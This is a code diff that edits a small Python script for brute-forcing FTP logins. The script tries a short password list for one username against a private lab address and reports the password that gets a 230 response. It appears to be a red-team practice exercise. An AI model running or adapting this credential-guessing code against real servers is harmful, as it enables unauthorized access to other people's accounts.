@@ -8,7 +8,6 @@ import re
 
 IP_ADDRESS = '192.168.84.137'
 PORT = 21
-clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # attempt to connect to ftp server
 def connection(uname, password):
@@ -31,7 +30,7 @@ def connection(uname, password):
     # recieve response in 1024 bytes
     response = s.recv(1024)
 
-    s.send(('USER ' + uname + '\r\n').encode())
+    s.send(( 'USER ' +uname + '\r\n').encode())
 
     response = s.recv(1024)
 
@@ -41,6 +40,7 @@ def connection(uname, password):
 
     s.send(('QUIT\r\n').encode())
 
+    s.close()
 
     return response
 
@@ -48,15 +48,22 @@ def connection(uname, password):
 uname = 'abc'
 
 # super small list, just trying to verify it is functional
-passwords = ['abc', 'abc123', 'password123', 'yuck','123']
+passwords = ['abc', 'redteam', 'password123', 'yuck','123']
 
 # lil loop
 for password in passwords:
+    print('Trying ...')
+
     attempt = connection(uname, password)
-    if attempt=='230':
+    # print(attempt)
+    if attempt==b'230':
         print('[*] Congrats, password is:' + password)
         sys.exit(0)
-    # else:
-        # continue
+    else:
+        print('sorry, sucker')
+        print()
+
+ 
+
 
 
